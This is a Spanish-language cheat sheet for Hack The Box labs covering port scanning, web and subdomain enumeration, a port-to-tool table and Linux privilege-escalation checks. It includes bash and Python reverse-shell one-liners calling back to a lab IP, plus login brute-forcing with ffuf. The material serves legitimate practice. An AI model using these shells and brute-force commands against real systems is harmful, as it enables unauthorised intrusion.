# Chuleta / Metodología general (HTB)

Recopilación de los comandos y el flujo de trabajo que aparecen al principio del documento. Sirve de referencia transversal para todas las máquinas.

---

## Comandos para lanzar siempre

**[en Kali] Arranque:**
```bash
sudo pkill VBoxClient
setxkbmap es                       # teclado español
```

**[en Kali] Escaneo de puertos:**
```bash
sudo nmap -p- --min-rate 5000 <ip>                 # todos los puertos, rápido
sudo nmap -p22,80 -sVC <ip> -oN targeted           # detalle de los abiertos
nmap -sU --top-ports 100 --open -T5 -v -n <ip>     # UDP
# Ctrl+U en el navegador → ver el código / dominio del sitio
```

**[en Kali] Recopilar código fuente de un .git expuesto:**
```bash
git clone https://github.com/arthaud/git-dumper
```

## Reverse shell

**[en la víctima] Reverse shell bash:**
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.51/443 0>&1"
```

**[en la víctima] Estabilizar la TTY (tras recibir la shell):**
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
```

## Escalada de privilegios (Linux) — primeras comprobaciones
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null     # binarios SUID
getcap -r / 2>/dev/null                     # capabilities
lsb_release -a                              # versión del SO
# linpeas.sh / winpeas (automatizado)
```

**[en la víctima] Reverse shell Python (one-liner):**
```python
import socket,subprocess,os
s=socket.socket()
s.connect(("10.10.14.51",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

## Enumeración web

**[en Kali] Subdominios / vhosts:**
```bash
gobuster dns --domain board.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "http://acmeitsupport.thm" -H "Host: FUZZ.acmeitsupport.thm" -mc 200
```

**[en Kali] FFUF (usos típicos):**
```bash
ffuf -u http://sitio.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt         # directorios/archivos
ffuf -u http://sitio.htb -H "Host: FUZZ.sitio.htb" -w wordlist.txt -fs 310     # subdominios
ffuf -u http://sitio.htb/page?id=FUZZ -w numbers.txt                           # parámetros GET
ffuf -u http://sitio.htb/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt  # fuerza bruta login
```

## Referencia de puertos y herramientas

| Puerto | Servicio | Herramientas comunes |
|--------|----------|----------------------|
| 80/443 | HTTP(S) | gobuster, ffuf, nikto, burpsuite |
| 8080/8443 | HTTP alt | igual que arriba |
| 21 | FTP | ftp, netexec ftp, login anónimo |
| 445/139 | SMB | netexec smb, smbclient, enum4linux |
| 2049 | NFS | showmount -e <ip>, mount |
| 22 | SSH | ssh, fuerza bruta con hydra |
| 23 | Telnet | telnet |
| 3389 | RDP | xfreerdp, rdesktop |
| 5985/5986 | WinRM | evil-winrm, netexec winrm |
| 1433 | MSSQL | netexec mssql, impacket-mssqlclient |
| 3306 | MySQL | mysql -h <ip> -u root |
| 5432 | PostgreSQL | psql -h <ip> |
| 1521 | Oracle | odat, sqlplus |
| 6379 | Redis | redis-cli -h <ip> |
| 27017 | MongoDB | mongosh |
| 53 | DNS | dig, nslookup, zone transfer |
| 88 | Kerberos | kerbrute, GetNPUsers.py, GetUserSPNs.py |
| 389/636 | LDAP/LDAPS | netexec ldap, ldapsearch |
| 25 | SMTP | telnet, swaks, user enumeration |
| 110 | POP3 | telnet |
| 143 | IMAP | telnet, curl |
| 111 | RPCbind | rpcinfo -p <ip> |
| 161 | SNMP | snmpwalk, onesixtyone |
| 512/513/514 | R-services | rlogin, rwho |
| 873 | Rsync | rsync --list-only rsync://<ip>/ |

## Flujo de ataque (resumen)
```
Reconocimiento → Nmap rápido → Nmap detallado → ¿Qué servicios hay?
  ├─ Web 80/443  → directorios → explotar (SQLi, LFI, RCE...)
  ├─ SMB / AD    → guest/null session → con credenciales (LDAP, WinRM, spray)
  └─ SSH/FTP/DB  → login anónimo → archivos/credenciales
→ Acceso inicial (foothold) → Post-explotación (linpeas/winpeas, sudo -l, SUID)
→ Escalada de privilegios → root / SYSTEM ✓
```
